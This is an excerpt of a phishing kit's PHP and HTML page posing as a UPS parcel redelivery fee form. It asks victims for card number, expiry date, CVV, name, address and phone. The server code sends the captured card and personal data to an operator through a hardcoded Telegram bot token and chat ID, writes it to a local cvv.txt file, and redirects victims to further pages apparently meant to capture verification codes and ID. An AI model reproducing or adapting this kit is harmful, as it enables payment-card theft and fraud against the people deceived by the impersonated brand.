...
$realip=base64_decode($_GET['realip']);
if(isset($_POST['submit'])){
$BotTelegramToken="5309592593:AAFpMODdPjov6v1J5zJriKeVqsf55If2RtA";
$IdTelegram=array("-859650911"); 
$realcc = str_replace(' ', '', $_POST['ccnumb']);
$json = file_get_contents_curl('https://lookup.binlist.net/'.substr($realcc, 0, 6));
...
if($otleb_email==1){
$messageTelegram .= "|Email         :  ".base64_decode($_GET['email'])."\n";
}
$messageTelegram .= "|FULL NAME     :  ".base64_decode($_GET['fullname'])."\n";
$messageTelegram .= "|Address 1     :  ".base64_decode($_GET['add1'])."\n";
$messageTelegram .= "|City          :  ".$_POST['mcity']."\n";
$messageTelegram .= "|state         :  ".$_POST['mstate']."\n";
$messageTelegram .= "|zip Code      :  ".$_POST['zip']."\n";
$messageTelegram .= "|Phone Number  :  ".base64_decode($_GET['gonna'])."\n"; 
$messageTelegram .= "|=[ CVV INFORMATION ]=|\n"; 
$messageTelegram .= "|CC NUMB    :  ".$_POST['ccnumb']."\n";
$messageTelegram .= "|EXPR DA    :  ".$_POST['expr']."\n";
$messageTelegram .= "|CVV        :  ".$_POST['cvv']."\n";
$messageTelegram .= "|BNK NM    :  ".$BANKNAME."\n";
$messageTelegram .= "|TYPE    :  ".$CCTYPE."\n";
$messageTelegram .= "|BRAND    :  ".$CCBRAND."\n";
...
$xmyfile = fopen("cvv.txt", "a+");
fwrite($xmyfile, $messageTelegram);
fclose($xmyfile);
$jsonx = file_get_contents_curl('http://www.geoplugin.net/json.gp?ip='.$realip);
$objx = json_decode($json);
$countryCode=$objx->{'geoplugin_countryCode'};
 if($otleb_vbv==1){
  HEADER("Location: help.php?numb=".$_POST['ccnumb']."&phone=".base64_decode($_GET['gonna'])."&realip=".$realip.'&repeat=0');
 }else{
	 if($otleb_id==1){
		 HEADER("Location: id.php?realip=".$realip);
	 }else{
...
<script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
  ...
  <hr>
  <p class="mb-0">Note: This redelivery costs ( 0.86 )</p>
</div>

<p id="myerror"  style="margin-top:15px;font-size:14px;display: none;"><a style="color:red;">Check your card details and try again.</a></p>
...
<script type="text/javascript">
  function nik(){
   if(document.getElementById("ccnumb").value==""){
    ...
    document.getElementById('pleaseloading').style.display='block';
    setTimeout(function(){
...
function checkExp(){
    var match=$('#expr').val().match(/^\s*(0?[1-9]|1[0-2])\/(\d\d|\d{4})\s*$/);
    if (!match){
        return;
    }
...
function barranayek(){
  var validationResult = CCValidationWithType($('#ccnumb').val());
...
<form method="post" action="">
  <div id="paying">
<?php
echo('<input  name="mcity" value="'.base64_decode($_GET['mcity']).'" style="display:none;"><input  name="mstate" value="'.base64_decode($_GET['mstate']).'" style="display:none;"><input  name="zip" value="'.base64_decode($_GET['zip']).'" style="display:none;">');
?>
<input required name="ccnumb" id="ccnumb" pattern="[0-9]*" onblur="barranayek();" oninput="this.value=this.value.replace(/[^0-9']/g,'');" class="ups-simpleTrack_input ups-form_input" placeholder="Card Number" style="max-width:100%">
<br>
<?php 
echo('<input required  name="ccnum" id="ccnum" value="'.base64_decode($_GET['fullname']).'" class="ups-simpleTrack_input ups-form_input" placeholder="Name on card" style="max-width:100%">');
?>
<br>
<input required  id="expr" class="ups-simpleTrack_input ups-form_input" onblur="checkExp();" placeholder="Expiration date (MM/YY)" maxlength="5" onkeyup="formatString(event);" name="expr" style="max-width:100%">
<br>
<input required  name="cvv" pattern="[0-9]*" id="cvv" class="ups-simpleTrack_input ups-form_input" maxlength='4' oninput="this.value=this.value.replace(/[^0-9']/g,'');" placeholder="Security Code" onkeypress="return digitKeyOnly(event)" style="max-width:100%">
<br>

<input type="button" class="ups-cta ups-cta_primary" id="myBtn" style="cursor: pointer;" onclick="nik();" value="Pay now">

</div>
<div id="pleaseloading" style="display:none;">
Please Wait ...
  <center>
...
<button _ngcontent-c1="" style="display: none;" class="ups-cta ups-cta_primary" id="submitus" type="submit" name="submit" id="submit" style="cursor: pointer;">Pay now</button>
</form>
